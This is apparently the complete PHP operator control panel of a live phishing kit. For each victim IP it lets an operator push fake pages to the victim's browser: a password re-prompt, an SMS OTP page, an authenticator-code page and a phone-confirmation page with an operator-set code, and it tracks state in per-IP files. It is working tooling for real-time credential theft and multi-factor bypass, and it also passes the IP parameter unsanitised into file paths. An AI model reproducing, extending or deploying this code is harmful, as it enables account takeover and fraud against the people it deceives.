<?php
error_reporting(0);
ini_set('display_errors', 0);
$ip = $_GET['ip'];
if ($_POST['button'] == "submit") {
    $action = $_POST['action'];
   if ($action == "2") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/data.html');
    echo '<center><h1 style="color: green;"><br><br>Phone OTP Page Send Successfully<h1></center>';
   } elseif ($action == "7") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/logins.html');
    echo '<center><h1 style="color: green;"><br><br>Password Page Send Successfully<h1></center>';
   } elseif ($action == "5") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/success.html');
    echo '<center><h1 style="color: green;"><br><br>Finishing Page Send Successfully<h1></center>';
   } elseif ($action == "8") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/auth.html');
    echo '<center><h1 style="color: green;"><br><br>Authenticator Page Send Successfully<h1></center>';
   } elseif ($action == "11") {
    file_put_contents('tmp/'.$ip.'.txt', '1');
    file_put_contents('tmp/loc_'.$ip.'.txt', 'sites/phone.html');
    echo '<center><h1 style="color: green;"><br><br>Phone Confirmation Page Send Successfully<h1> <br><br><form method="POST" action=""><input type="hidden" name="loading" value="1"><button type="submit" value="submit" name="button" style="margin-left: 8px;">Send Another Page</button></form></center>';
   }

   try {
        if (isset($_POST['phone'])) {
            file_put_contents('tmp/phone_' . $ip . '.txt', $_POST['phone']);
        }
    } catch (Exception $e) { }

    try {
        if (isset($_POST['loading'])) {
            file_put_contents('tmp/'.$ip.'.txt', '0');
            file_put_contents('tmp/loc_'.$ip.'.txt', '0');
            header("Refresh:0");
        }
    } catch (Exception $e) { }

   
} else {
    $file = file_get_contents('tmp/'.$ip.'.txt');
    if ($file == "0" && $ip != "") {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control</title>
    <style>
        input[type="radio"]:checked:after {
            width: 8px;
            height: 8px;
            border-radius: 15px;
            position: relative;
            background-color: rgb(8, 160, 8);
            content: "";
            display: inline-block;
            visibility: visible;
            border: 2px solid white;
        }

        #phoneConfirmationInput {
            display: none;
            margin-top: 10px;
        }
    </style>
    <script>
        function toggleInput() {
            var phoneConfirmationRadio = document.querySelector("input[name=\"action\"][value=\"11\"]");
            var inputBox = document.getElementById("phoneConfirmationInput");
            var phoneInput = document.getElementById("phone");
            
            if (phoneConfirmationRadio.checked) {
                inputBox.style.display = "block";
                phoneInput.setAttribute("required", "true");
            } else {
                inputBox.style.display = "none";
                phoneInput.removeAttribute("required");
            }
        }

        window.onload = function() {
            var radios = document.querySelectorAll("input[name=\"action\"]");
            radios.forEach(function(radio) {
                radio.addEventListener("change", toggleInput);
            });
        };
    </script>
</head>
<body style="margin-left: 10%; margin-top: 20px;">
    <form method="POST" action="">
        <p>Select your action:</p>
        <input type="radio" name="action" value="7" required>
        <label for="css">Ask Password Again</label><br>

        <input type="radio" name="action" value="2" required>
        <label for="html">Send OTP Page</label><br>

        <input type="radio" name="action" value="8" required>
        <label for="css">Send Authenticator Page</label><br>

        <input type="radio" name="action" value="11" required>
        <label for="css">Send Phone Confirmation Page</label><br>

        <input type="radio" name="action" value="5" required>
        <label for="css">Finish</label><br>

        <div id="phoneConfirmationInput">
            <label for="phone">Phone Code:</label>
            <input type="text" id="phone" name="phone" placeholder="Enter phone code">
        </div>

        <br><br>
        <button type="submit" value="submit" name="button" style="margin-left: 8px;">Submit</button>
    </form>
</body>
</html>
';
        } else {
            echo '<center><h1 style="color: red;"><br><br>Action Not Found<h1></center>'; 
        }
}
?>
<script>
if ( window.history.replaceState ) {
  window.history.replaceState( null, null, window.location.href );
}
</script>